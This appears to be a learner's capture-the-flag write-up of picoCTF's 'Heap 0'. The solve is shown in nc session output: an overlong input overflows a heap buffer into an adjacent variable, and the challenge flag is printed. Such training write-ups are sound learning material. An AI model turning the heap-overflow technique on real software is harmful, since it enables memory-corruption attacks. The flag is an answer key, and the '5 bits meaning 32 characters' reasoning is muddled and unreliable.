# Heap 0
This challenge asks us to overflow the heap to next memory address

## Files Provided
[Binary File](https://artifacts.picoctf.net/c_tethys/28/chall)

[Source File](https://artifacts.picoctf.net/c_tethys/28/chall.c)

## Hints Given
Hint 1: What part of the heap do you have control over and how far is it from the safe_var?

## Procedure
1. I open the source code of the system on the browser and find that it shows us the flag when the `save_var` is not equal to `bico`

![image](https://github.com/user-attachments/assets/15269c2b-751a-4299-9f8c-3d6df5fac7c6)

2. I also found that the maximum size of the `input_var` is `5 bits` meaning `32 characters`

![image](https://github.com/user-attachments/assets/ed533354-77fc-4e4d-bd00-b9512ba20021)

3. So i overflowed the `input_var` with `36 characters` which led the `save_var` to be become `pico` which is not equal to `bico`

```bash
CheatingMM-picoctf@webshell:~$ nc tethys.picoctf.net 53432

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x598df2e0b2b0  ->   pico
+-------------+----------------+
[*]   0x598df2e0b2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: kbkjbhtdyfhtysdtheydfpicodfthwepico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x598df2e0b2b0  ->   kbkjbhtdyfhtysdtheydfpicodfthwepico
+-------------+----------------+
[*]   0x598df2e0b2d0  ->   ico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2       
Data for buffer: enfwfnfkewfenfowfythyduisghtugitpico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x598df2e0b2b0  ->   enfwfnfkewfenfowfythyduisghtugitpico
+-------------+----------------+
[*]   0x598df2e0b2d0  ->   pico
+-------------+----------------+
```

4. Printing the flag got me the flag
```bash
1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_76775c7c}
^C
CheatingMM-picoctf@webshell:~$
```

## Flag Provided
`picoCTF{my_first_heap_overflow_76775c7c}`
